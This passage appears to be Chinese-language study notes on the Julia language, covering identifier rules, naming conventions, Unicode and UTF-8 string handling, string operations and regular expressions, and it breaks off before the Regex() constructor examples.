<p>像 <code>+</code> 这样的运算符也是合法的标识符，但是它们会被特别地解析。 在一些上下文中，运算符可以像变量一样使用，比如 <code>(+)</code> 表示加函数，语句 <code>(+) = f</code>会把它重新赋值。大部分 Unicode 中缀运算符（Sm 类别），像 <code>⊕</code>，会被解析成真正的中缀运算符，并且支持用户自定义方法（举个例子，你可以使用语句 <code>const ⊗ = kron</code>将 <code>⊗</code> 定义为中缀的 Kronecker 积）。 运算符也可以使用修改标记、引号和上标/下标进行加缀，例如 <code>+̂ₐ″</code> 被解析成一个与 <code>+</code> 具有相同优先级的中缀运算符。以下标/上标字母结尾的运算符与后续变量名之间需要一个空格。举个例子，如果 <code>+ᵃ</code> 是一个运算符，那么 <code>+ᵃx</code> 应该被写为<code>+ᵃ x</code>，以区分表达式 <code>+ ᵃx</code> ，其中 <code>ᵃx</code> 是变量名。</p>
<p>一类特定的变量名是只包含下划线的变量名。这些标识符只能赋值，不能用于给其他变量赋值。严格来说，它们只能用作<a href="https://en.wikipedia.org/wiki/Value_(computer_science">左值</a>#lrvalue) 而不能作<a href="https://en.wikipedia.org/wiki/R-value">右值</a>:<br><img src="/2023/01/30/julia/image-20230222104416058.png" alt="image-20230222104416058"></p>
<p>唯一明确禁止的变量名称是内置<a href="https://cn.julialang.org/JuliaZH.jl/latest/base/base/#Keywords">关键字</a>的名称：<br><img src="/2023/01/30/julia/image-20230222104554049.png" alt="image-20230222104554049"></p>
<p>某些 Unicode 字符被认为是等效的标识符。不同的输入 Unicode 组合字符的方法（例如：重音）被视为等价的（Julia 标识符采用 <a href="http://www.macchiato.com/unicode/nfc-faq">NFC</a> 标准）。Julia 还加入了一些非标准的等价字符，用于在视觉上相似且易于通过某些输入法输入的字符。Unicode 字符 <code>ɛ</code> (U+025B: Latin small letter open e) 和 <code>µ</code> (U+00B5: micro sign) 被视为等同于相应的希腊字母。点 <code>·</code> (U+00B7) 和希腊字符<a href="https://en.wikipedia.org/wiki/Interpunct">间断</a> <code>·</code> (U+0387) 都被当作数学上的点积运算符 <code>⋅</code> (U+22C5)。减号 <code>−</code> (U+2212) 与连接号 <code>-</code> (U+002D) 也被视作相同的符号。</p>
<h3 id="2-6-3-命名规范"><a href="#2-6-3-命名规范" class="headerlink" title="2.6.3 命名规范"></a>2.6.3 命名规范</h3><ul>
<li>变量的名字采用小写。</li>
<li>使用下划线（<code>&#39;_&#39;</code>）来分隔名字中的单词，但是不鼓励使用下划线 除非在不使用下划线时名字会非常难读。</li>
<li>类型 (<code>Type</code>) 和模块（<code>Module</code>）的名字使用大写字母开头，并且用大写字母 而不是用下划线分隔单词。</li>
<li>函数（<code>function</code>）和宏（<code>macro</code>）的名字使用小写，不使用下划线。</li>
<li>会对输入参数进行更改的函数要使用 <code>!</code> 结尾。这些函数有时叫做 “mutating” 或 “in-place” 函数，因为它们在被调用后会修改他们的输入参数的内容 而不仅仅只是返回一个值。</li>
</ul>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>Julia 可以简单高效地处理纯粹的 ASCII 文本以及 Unicode 文本。 甚至，在 Julia 中用 C 语言风格的代码来处理 ASCII 字符串，可以在不失性能和易读性的前提下达到预期效果。当遇到非 ASCII 文本时，Julia会优雅明确地提示错误信息而不是引入乱码。 这时，直接修改代码使其可以处理非 ASCII 数据即可。</p>
<h3 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h3><p>Char类型的值代表单个字符<br><img src="/2023/01/30/julia/image-20230303165130255.png" alt="image-20230303165130255"></p>
<p>将char转换为对应的整数值，即Unicode代码<br><img src="/2023/01/30/julia/image-20230303165315262.png" alt="image-20230303165315262"></p>
<p>使用isvalid函数检查char的转化的值是否为有效值<br><img src="/2023/01/30/julia/image-20230303165545912.png" alt="image-20230303165545912"></p>
<p>目前，有效的 Unicode 码点为，从 <code>U+0000</code> 至 <code>U+D7FF</code>，以及从 <code>U+E000</code> 至 <code>U+10FFFF</code>。 它们还未全部被赋予明确的含义，也还没必要能被程序识别；然而，所有的这些值都被认为是有效的 Unicode 字符。</p>
<p>你可以在单引号中输入任何 Unicode 字符，通过使用 <code>\u</code> 加上至多 ４ 个十六进制数字或者 <code>\U</code> 加上至多 ８ 个十六进制数（最长的有效值也只需要 6 个）：<br><img src="/2023/01/30/julia/image-20230303165745842.png" alt="image-20230303165745842"></p>
<p>char的值进行比较和有限的算数运算<br><img src="/2023/01/30/julia/image-20230303170052322.png" alt="image-20230303170052322"></p>
<h3 id="字符串基础"><a href="#字符串基础" class="headerlink" title="字符串基础"></a>字符串基础</h3><p>字符串字面量由双引号或三重双引号分隔<br><img src="/2023/01/30/julia/image-20230303170410055.png" alt="image-20230303170410055"></p>
<p>换行输入<br><img src="/2023/01/30/julia/image-20230303170456843.png" alt="image-20230303170456843"></p>
<p>对字符串中字符进行索引<br><img src="/2023/01/30/julia/image-20230303171246986.png" alt="image-20230303171246986"></p>
<p>第一个元素的索引（字符串的第一个字符）由 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/collections/#Base.firstindex"><code>firstindex(str)</code></a> 返回，最后一个元素（字符）的索引由 <a href="https://cn.julialang.org/JuliaZH.jl/latest/manual/strings/manual/@ref"><code>lastindex(str)</code> </a>返回。关键字 <code>begin</code> 和 <code>end</code> 可以在索引操作中使用，它们分别表示给定维度上的第一个和最后一个索引。<br><img src="/2023/01/30/julia/image-20230303195144889.png" alt="image-20230303195144889"></p>
<p>范围索引提取字符串<br><img src="/2023/01/30/julia/image-20230303195245405.png" alt="image-20230303195245405"></p>
<p>注意，表达式 <code>str[k]</code> 和 <code>str[k:k]</code> 不会给出相同的结果：<br><img src="/2023/01/30/julia/image-20230303195318083.png" alt="image-20230303195318083"></p>
<h3 id="SubString类型"><a href="#SubString类型" class="headerlink" title="SubString类型"></a>SubString类型</h3><p>使用类型SubString将视图创建为字符串。<br><img src="/2023/01/30/julia/image-20230303195552002.png" alt="image-20230303195552002"></p>
<h3 id="Unicode和UTF-8"><a href="#Unicode和UTF-8" class="headerlink" title="Unicode和UTF-8"></a>Unicode和UTF-8</h3><p>在字符字面量中，Unicode 代码可以用 Unicode <code>\u</code> 和 <code>\U</code> 转义序列表示，也可以用所有标准 C 转义序列表示。<br><img src="/2023/01/30/julia/image-20230303195811533.png" alt="image-20230303195811533"><br>在 Julia 中字符串索引指的是代码单元（对于 UTF-8 来说等同于字节/byte），固定宽度的构建块用于编码任意字符（code point)。这意味着并非每个索引到 UTF-8 字符串的字节都必须是一个字符的有效索引。如果在这种无效字节索引处索引字符串，将会报错：<br><img src="/2023/01/30/julia/image-20230303200021918.png" alt="image-20230303200021918"><br>可以看到报错提示下一个有效的索引是4，字符 <code>∀</code> 是一个三字节字符，因此索引 2 和 3 都是无效的，或使用nextind(str,x)来计算下一个有效索引号，或使用prevind()来计算前一个有效索引<br><img src="/2023/01/30/julia/image-20230303200207494.png" alt="image-20230303200207494"><br><img src="/2023/01/30/julia/image-20230303200654273.png" alt="image-20230303200654273"></p>
<p>使用范围索引提取字符串也需要有效的字节索引，否则会抛出错误</p>
<p>由于可变长度的编码，字符串中的字符数（由 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/arrays/#Base.length-Tuple{AbstractArray}"><code>length(s)</code></a> 给出）并不总是等于最后一个索引的数字。如果你从 1 到 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/collections/#Base.lastindex"><code>lastindex(s)</code></a> 迭代并索引到 <code>s</code>，未报错时返回的字符序列是包含字符串 <code>s</code> 的字符序列。所以，总是有 <code>length(s) &lt;= lastindex(s)</code>，这是因为字符串中的每个字符必须有它自己的索引。<br><img src="/2023/01/30/julia/image-20230303201059435.png" alt="image-20230303201059435"></p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对str字符进行迭代的一个冗长而低效的方式</span></span><br><span class="line">julia&gt; <span class="keyword">for</span> i = firstindex(str):lastindex(str)</span><br><span class="line">           <span class="keyword">try</span></span><br><span class="line">               println(str[i])</span><br><span class="line">           <span class="keyword">catch</span></span><br><span class="line">               <span class="comment"># ignore the index error</span></span><br><span class="line">           <span class="keyword">end</span></span><br><span class="line">       <span class="keyword">end</span></span><br><span class="line">∀</span><br><span class="line"></span><br><span class="line">x</span><br><span class="line"></span><br><span class="line">∃</span><br><span class="line"></span><br><span class="line">y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把字符串本身用作迭代对象</span></span><br><span class="line">julia&gt; <span class="keyword">for</span> c <span class="keyword">in</span> str</span><br><span class="line">           println(c)</span><br><span class="line">       <span class="keyword">end</span></span><br><span class="line">∀</span><br><span class="line"></span><br><span class="line">x</span><br><span class="line"></span><br><span class="line">∃</span><br><span class="line"></span><br><span class="line">y</span><br></pre></td></tr></table></figure>
<h4 id="获取字符串有效索引eachindex"><a href="#获取字符串有效索引eachindex" class="headerlink" title="获取字符串有效索引eachindex()"></a>获取字符串有效索引eachindex()</h4><p><img src="/2023/01/30/julia/image-20230303201644933.png" alt="image-20230303201644933"></p>
<p>Julia 中的字符串可以包含无效的 UTF-8 代码单元序列。这个惯例允许把任何字序列当作 <code>String</code>。在这种情形下的一个规则是，当从左到右解析代码单元序列时，字符由匹配下面开头位模式之一的最长的 8 位代码单元序列组成（每个 <code>x</code> 可以是 <code>0</code> 或者 <code>1</code>）：</p>
<ul>
<li><code>0xxxxxxx</code>;</li>
<li><code>110xxxxx</code> <code>10xxxxxx</code>;</li>
<li><code>1110xxxx</code> <code>10xxxxxx</code> <code>10xxxxxx</code>;</li>
<li><code>11110xxx</code> <code>10xxxxxx</code> <code>10xxxxxx</code> <code>10xxxxxx</code>;</li>
<li><code>10xxxxxx</code>;</li>
<li><code>11111xxx</code>.</li>
</ul>
<p>特别地，这意味着过长和过高的代码单元序列及其前缀将被视为单个无效字符，而不是多个无效字符。这个规则最好用一个例子来解释：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> s = <span class="string">&quot;\xc0\xa0\xe2\x88\xe2|&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>&quot;\xc0\xa0\xe2\x88\xe2|&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> foreach(display, s)</span></span><br><span class="line"><span class="language-julia"></span>&#x27;\xc0\xa0&#x27;: [overlong] ASCII/Unicode U+0020 (category Zs: Separator, space)</span><br><span class="line">&#x27;\xe2\x88&#x27;: Malformed UTF-8 (category Ma: Malformed, bad data)</span><br><span class="line">&#x27;\xe2&#x27;: Malformed UTF-8 (category Ma: Malformed, bad data)</span><br><span class="line">&#x27;|&#x27;: ASCII/Unicode U+007C (category Sm: Symbol, math)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> isvalid.(collect(s))</span></span><br><span class="line"><span class="language-julia"></span>4-element BitArray&#123;1&#125;:</span><br><span class="line"> 0</span><br><span class="line"> 0</span><br><span class="line"> 0</span><br><span class="line"> 1</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> s2 = <span class="string">&quot;\xf7\xbf\xbf\xbf&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>&quot;\U1fffff&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> foreach(display, s2)</span></span><br><span class="line"><span class="language-julia"></span>&#x27;\U1fffff&#x27;: Unicode U+1FFFFF (category In: Invalid, too high)</span><br></pre></td></tr></table></figure>
<p>我们可以看到字符串 <code>s</code> 中的前两个代码单元形成了一个过长的空格字符编码。这是无效的，但是在字符串中作为单个字符是可以接受的。接下来的两个代码单元形成了一个有效的 3 位 UTF-8 序列开头。然而，第五个代码单元 <code>\xe2</code> 不是它的有效延续，所以代码单元 3 和 4 在这个字符串中也被解释为格式错误的字符。同理，由于 <code>|</code> 不是它的有效延续，代码单元 5 形成了一个格式错误的字符。最后字符串 <code>s2</code> 包含了一个太高的代码。</p>
<h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><p>最常见最有用的字符串操作是级联：<br><img src="/2023/01/30/julia/image-20230305204958870.png" alt="image-20230305204958870"><img src="/2023/01/30/julia/image-20230305205026380.png" alt="image-20230305205026380"></p>
<p>意识到像对无效 UTF-8 字符进行级联这样的潜在危险情形是非常重要的。生成的字符串可能会包含和输入字符串不同的字符，并且其中字符的数目也可能少于被级联字符串中字符数目之和，例如：<br><img src="/2023/01/30/julia/image-20230305205456413.png" alt="image-20230305205456413"><br><img src="/2023/01/30/julia/image-20230305205630040.png" alt="image-20230305205630040"></p>
<h4 id><a href="#" class="headerlink" title="*"></a>*</h4><p>在数学上，<code>+</code> 通常表示可交换运算（<em>commutative</em> operation）——运算对象的顺序不重要。一个例子是矩阵加法：对于任何形状相同的矩阵 <code>A</code> 和 <code>B</code>，都有 <code>A + B == B + A</code>。与之相反，<code>*</code> 通常表示不可交换运算——运算对象的顺序很重要。例如，对于矩阵乘法，一般 <code>A * B != B * A</code>。</p>
<h3 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h3><p>Julia 允许像 Perl 中一样使用 <code>$</code> 对字符串字面量进行插值<br><img src="/2023/01/30/julia/image-20230305205949310.png" alt="image-20230305205949310"><br>在 <code>$</code> 之后最短的完整表达式被视为插入其值于字符串中的表达式。因此，你可以用括号向字符串中插入任何表达式：<br><img src="/2023/01/30/julia/image-20230305210133764.png" alt="image-20230305210133764"></p>
<h3 id="三引号字符串字面量"><a href="#三引号字符串字面量" class="headerlink" title="三引号字符串字面量"></a>三引号字符串字面量</h3><p>当使用三引号（<code>&quot;&quot;&quot;...&quot;&quot;&quot;</code>）创建字符串时，它们有一些在创建更长文本块时可能用到的特殊行为。</p>
<p>首先，三引号字符串也被反缩进到最小缩进线的水平。这在定义包含缩进的字符串时很有用。例如：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> str = <span class="string">&quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-julia">           Hello,</span></span></span><br><span class="line"><span class="string"><span class="language-julia">           world.</span></span></span><br><span class="line"><span class="string"><span class="language-julia">         &quot;&quot;&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>&quot;  Hello,\n  world.\n&quot;</span><br></pre></td></tr></table></figure>
<h3 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h3><p>使用 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/arrays/#Base.findfirst-Tuple{Any}"><code>findfirst</code></a> 与 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/arrays/#Base.findlast-Tuple{Any}"><code>findlast</code></a> 函数搜索特定字符的索引：<br><img src="/2023/01/30/julia/image-20230308181615006.png" alt="image-20230308181615006"></p>
<p> <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.occursin"><code>occursin</code></a> 函数检查在字符串中某子字符串可否找到。<br><img src="/2023/01/30/julia/image-20230308181741582.png" alt="image-20230308181741582"></p>
<p><img src="/2023/01/30/julia/image-20230308181955225.png" alt="image-20230308181955225"><br><img src="/2023/01/30/julia/image-20230308182301870.png" alt="image-20230308182301870"></p>
<ul>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/collections/#Base.firstindex"><code>firstindex(str)</code></a> 给出可用来索引到 <code>str</code> 的最小（字节）索引（对字符串来说这总是 1，对于别的容器来说却不一定如此）。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/collections/#Base.lastindex"><code>lastindex(str)</code></a> 给出可用来索引到 <code>str</code> 的最大（字节）索引。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/arrays/#Base.length-Tuple{AbstractArray}"><code>length(str)</code></a>，<code>str</code> 中的字符个数。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/arrays/#Base.length-Tuple{AbstractArray}"><code>length(str, i, j)</code></a>，<code>str</code> 中从 <code>i</code> 到 <code>j</code> 的有效字符索引个数。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.ncodeunits-Tuple{AbstractString}"><code>ncodeunits(str)</code></a>，字符串中<a href="https://en.wikipedia.org/wiki/Character_encoding#Terminology">代码单元</a>（<a href="https://zh.wikipedia.org/wiki/字符编码#字符集、代码页，与字符映射">码元</a>）的数目。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.codeunit"><code>codeunit(str, i)</code></a> 给出在字符串 <code>str</code> 中索引为 <code>i</code> 的代码单元值。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.thisind"><code>thisind(str, i)</code></a>，给定一个字符串的任意索引，查找索引点所在的首个索引。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.nextind"><code>nextind(str, i, n=1)</code></a> 查找在索引 <code>i</code> 之后第 <code>n</code> 个字符的开头。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.prevind"><code>prevind(str, i, n=1)</code></a> 查找在索引 <code>i</code> 之前第 <code>n</code> 个字符的开始。</li>
</ul>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>在 Julia 中正则表达式的输入使用了前缀各类以 <code>r</code> 开头的标识符的非标准字符串字面量。最基本的不打开任何选项的正则表达式只用到了 <code>r&quot;...&quot;</code>：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> re = <span class="string">r&quot;^\s*(?:#|$)&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>r&quot;^\s*(?:#|$)&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> typeof(re)</span></span><br><span class="line"><span class="language-julia"></span>Regex</span><br></pre></td></tr></table></figure>
<p>若要检查正则表达式是否匹配某字符串，就用 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.occursin"><code>occursin</code></a>：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> occursin(<span class="string">r&quot;^\s*(?:#|$)&quot;</span>, <span class="string">&quot;not a comment&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>false</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> occursin(<span class="string">r&quot;^\s*(?:#|$)&quot;</span>, <span class="string">&quot;# a comment&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>true</span><br></pre></td></tr></table></figure>
<p>可以看到，<a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.occursin"><code>occursin</code></a> 只返回正确或错误，表明给定正则表达式是否在该字符串中出现。然而，通常我们不只想知道字符串是否匹配，更想了解它是如何匹配的。要捕获匹配的信息，可以改用 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.match"><code>match</code></a> 函数：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(<span class="string">r&quot;^\s*(?:#|$)&quot;</span>, <span class="string">&quot;not a comment&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(<span class="string">r&quot;^\s*(?:#|$)&quot;</span>, <span class="string">&quot;# a comment&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;#&quot;)</span><br></pre></td></tr></table></figure>
<p>若正则表达式与给定字符串不匹配，<a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.match"><code>match</code></a> 返回 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/constants/#Core.nothing"><code>nothing</code></a>——在交互式提示框中不打印任何东西的特殊值。除了不打印，它是一个完全正常的值，这可以用程序来测试：</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">m = match(<span class="string">r&quot;^\s*(?:#|$)&quot;</span>, line)</span><br><span class="line"><span class="keyword">if</span> m === <span class="literal">nothing</span></span><br><span class="line">    println(<span class="string">&quot;not a comment&quot;</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    println(<span class="string">&quot;blank or comment&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>如果正则表达式匹配，<a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.match"><code>match</code></a> 的返回值是一个 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.RegexMatch"><code>RegexMatch</code></a> 对象。这些对象记录了表达式是如何匹配的，包括该模式匹配的子字符串和任何可能被捕获的子字符串。上面的例子仅仅捕获了匹配的部分子字符串，但也许我们想要捕获的是注释字符后面的任何非空文本。我们可以这样做：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> m = match(<span class="string">r&quot;^\s*(?:#\s*(.*?)\s*$|$)&quot;</span>, <span class="string">&quot;# a comment &quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;# a comment &quot;, 1=&quot;a comment&quot;)</span><br></pre></td></tr></table></figure>
<p>当调用 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/strings/#Base.match"><code>match</code></a> 时，你可以选择指定开始搜索的索引。例如：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> m = match(<span class="string">r&quot;[0-9]&quot;</span>,<span class="string">&quot;aaaa1aaaa2aaaa3&quot;</span>,<span class="number">1</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> m = match(<span class="string">r&quot;[0-9]&quot;</span>,<span class="string">&quot;aaaa1aaaa2aaaa3&quot;</span>,<span class="number">6</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> m = match(<span class="string">r&quot;[0-9]&quot;</span>,<span class="string">&quot;aaaa1aaaa2aaaa3&quot;</span>,<span class="number">11</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;3&quot;)</span><br></pre></td></tr></table></figure>
<p>你可以从 <code>RegexMatch</code> 对象中提取如下信息：</p>
<ul>
<li>匹配的整个子字符串：<code>m.match</code></li>
<li>作为字符串数组捕获的子字符串：<code>m.captures</code></li>
<li>整个匹配开始处的偏移：<code>m.offset</code></li>
<li>作为向量的捕获子字符串的偏移：<code>m.offsets</code></li>
</ul>
<p>当捕获不匹配时，<code>m.captures</code> 在该处不再包含一个子字符串，而是 <code>什么也不</code> 包含；此外，<code>m.offsets</code> 的偏移量为 0（回想一下，Julia 的索引是从 1 开始的，因此字符串的零偏移是无效的）。下面是两个有些牵强的例子：</p>
<p><img src="/2023/01/30/julia/image-20230308185556575.png" alt="image-20230308185556575"></p>
<p><img src="/2023/01/30/julia/image-20230308185644065.png" alt="image-20230308185644065"></p>
<p>让捕获作为数组返回是很方便的，这样就可以用解构语法把它们和局域变量绑定起来。为了方便，<code>RegexMatch</code> 对象实现了传递到 <code>captures</code> 字段的迭代器方法，因此您可以直接解构匹配对象：</p>
<p><img src="/2023/01/30/julia/image-20230308185843846.png" alt="image-20230308185843846"></p>
<p>通过使用捕获组的编号或名称对 <code>RegexMatch</code> 对象进行索引，也可实现对捕获的访问：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> m=match(<span class="string">r&quot;(?&lt;hour&gt;\d+):(?&lt;minute&gt;\d+)&quot;</span>,<span class="string">&quot;12:45&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;12:45&quot;, hour=&quot;12&quot;, minute=&quot;45&quot;)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> m[:minute]</span></span><br><span class="line"><span class="language-julia"></span>&quot;45&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> m[<span class="number">2</span>]</span></span><br><span class="line"><span class="language-julia"></span>&quot;45&quot;</span><br></pre></td></tr></table></figure>
<p>使用 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/collections/#Base.replace-Tuple{Any, Vararg{Pair}}"><code>replace</code></a> 时利用 <code>\n</code> 引用第 n 个捕获组和给替换字符串加上 <code>s</code> 的前缀，可以实现替换字符串中对捕获的引用。捕获组 0 指的是整个匹配对象。可在替换中用 <code>\g&lt;groupname&gt;</code> 对命名捕获组进行引用。例如：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> replace(<span class="string">&quot;first second&quot;</span>, <span class="string">r&quot;(\w+) (?&lt;agroup&gt;\w+)&quot;</span> =&gt; <span class="string">s&quot;\g&lt;agroup&gt; \1&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>&quot;second first&quot;</span><br></pre></td></tr></table></figure>
<p>为明确起见，编号捕获组也可用 <code>\g&lt;n&gt;</code> 进行引用，例如：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> replace(<span class="string">&quot;a&quot;</span>, <span class="string">r&quot;.&quot;</span> =&gt; <span class="string">s&quot;\g&lt;0&gt;1&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>&quot;a1&quot;</span><br></pre></td></tr></table></figure>
<p>你可以在后双引号的后面加上 <code>i</code>, <code>m</code>, <code>s</code> 和 <code>x</code> 等标志对正则表达式进行修改。这些标志和 Perl 里面的含义一样，详见以下对 <a href="http://perldoc.perl.org/perlre.html#Modifiers">perlre 手册</a>的摘录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i   不区分大小写的模式匹配。</span><br><span class="line"></span><br><span class="line">    若区域设置规则有效，相应映射中代码点小于 255 的部分取自当前区域设置，更大代码点的部分取自 Unicode 规则。然而，跨越 Unicode 规则（ords 255/256）和 非 Unicode 规则边界的匹配将失败。</span><br><span class="line"></span><br><span class="line">m   将字符串视为多行。也即更改 &quot;^&quot; 和 &quot;$&quot;, 使其从匹配字符串的开头和结尾变为匹配字符串中任意一行的开头或结尾。</span><br><span class="line"></span><br><span class="line">s   将字符串视为单行。也即更改 &quot;.&quot; 以匹配任何字符，即使是通常不能匹配的换行符。</span><br><span class="line"></span><br><span class="line">    像这样一起使用，r&quot;&quot;ms，它们让 &quot;.&quot; 匹配任何字符，同时也支持分别在字符串中换行符的后面和前面用 &quot;^&quot; 和 &quot;$&quot; 进行匹配。</span><br><span class="line"></span><br><span class="line">x   令正则表达式解析器忽略多数既不是反斜杠也不属于字符类的空白。它可以用来把正则表达式分解成（略为）更易读的部分。和普通代码中一样，`#` 字符也被当作引入注释的元字符。</span><br></pre></td></tr></table></figure>
<p>例如，下面的正则表达式已打开所有三个标志：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="string">r&quot;a+.*b+.*?d$&quot;ism</span></span></span><br><span class="line"><span class="language-julia"></span>r&quot;a+.*b+.*?d$&quot;ims</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(<span class="string">r&quot;a+.*b+.*?d$&quot;ism</span>, <span class="string">&quot;Goodbye,\nOh, angry,\nBad world\n&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;angry,\nBad world&quot;)</span><br></pre></td></tr></table></figure>
<p><code>r&quot;...&quot;</code> 文本的构造没有插值和转义（除了引号 <code>&quot;</code> 仍然需要转义）。下面例子展示了它和标准字符串字面量之间的差别：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> x = <span class="number">10</span></span></span><br><span class="line"><span class="language-julia"></span>10</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="string">r&quot;<span class="variable">$x</span>&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>r&quot;$x&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="string">&quot;<span class="variable">$x</span>&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>&quot;10&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="string">r&quot;\x&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>r&quot;\x&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="string">&quot;\x&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>ERROR: syntax: invalid escape sequence</span><br></pre></td></tr></table></figure>
<p>Julia 也支持 <code>r&quot;&quot;&quot;...&quot;&quot;&quot;</code> 形式的三引号正则表达式字符串（或许便于处理包含引号和换行符的正则表达式）。</p>
<p><code>Regex()</code> 构造函数可以用于以编程方式创建合法的正则表达式字符串。这允许在构造正则表达式字符串时使用字符串变量的内容和其他字符串操作。上面的任何正则表达式代码可以在 <code>Regex()</code> 的单字符串参数中使用。下面是一些例子：</p>
